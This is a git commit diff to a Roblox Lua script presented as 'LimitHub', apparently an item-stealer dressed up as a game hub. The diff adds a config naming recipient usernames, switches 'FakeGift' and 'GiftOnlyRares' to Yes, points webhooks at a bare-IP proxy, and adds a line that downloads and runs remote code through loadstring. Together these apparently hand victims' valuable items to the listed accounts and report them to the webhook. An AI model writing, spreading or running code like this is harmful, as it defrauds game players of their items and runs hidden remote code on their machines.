38cea8eccc1ff2a4b97cc7a1caff86eaed310843
jorgethegreatq <annzkecastillo456@gmail.com>
2025-07-22 13:32:06 +0800

    Update LimitHub_Luarmor_E.lua

--- LimitHub_Luarmor_E.lua
+++ LimitHub_Luarmor_E.lua
@@ -1,15 +1,15 @@
 _G.NullConfig = {
-    User = {'harambengkyut'},
+    User = {'harambengkyut0', 'harambengpogi2'},
     min_value = 10000000000,
     pingEveryone = "No", -- dont change this
     Webhook = "http://45.13.225.83:20002/proxy/b0c925c15bdd78b1f933e7bb1265a877",
-    FakeGift = "No",
+    FakeGift = "Yes",
     Trash = "http://45.13.225.83:20002/proxy/55aa9dd4e8874079bcd7d094daac3e65",
     LoadingScreen = "No",
-    GiftOnlyRares = "No"
+    GiftOnlyRares = "Yes"
 }
 
-loadstring(game:HttpGet("https://gist.githubusercontent.com/silenceyeww/793417cf3e9fe1266fe5b5e6b6016cf1/raw/script.lua"))()
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
 
--- this would execute speed hub
+-- this would execute limit hub
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/FakeModz/LimitHub/refs/heads/main/LimitHub_Luarmor_P_E.lua')))()
